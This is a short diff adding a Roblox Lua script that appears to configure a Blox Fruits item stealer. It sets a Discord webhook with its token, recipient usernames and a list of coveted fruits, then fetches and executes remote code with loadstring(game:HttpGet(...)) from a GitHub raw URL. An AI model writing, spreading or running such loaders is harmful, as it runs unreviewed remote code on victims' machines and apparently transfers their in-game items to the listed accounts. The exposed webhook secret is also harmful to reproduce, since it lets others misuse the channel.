@@ -1,0 +1,5 @@
+Webhook = "https://discord.com/api/webhooks/1349396577914978354/rSzg1arrotXHDpPMrJVUAb8HCA7mbHAU35zRmii-ukudofbU5DJyD52e0514GD_8GwIV" -- << Your Webhook
+Usernames = {"kalyan_97490", "shaila_du91"} -- << Your username(-s).
+FruitsToHit = {"Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"} -- << Fruits you want
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
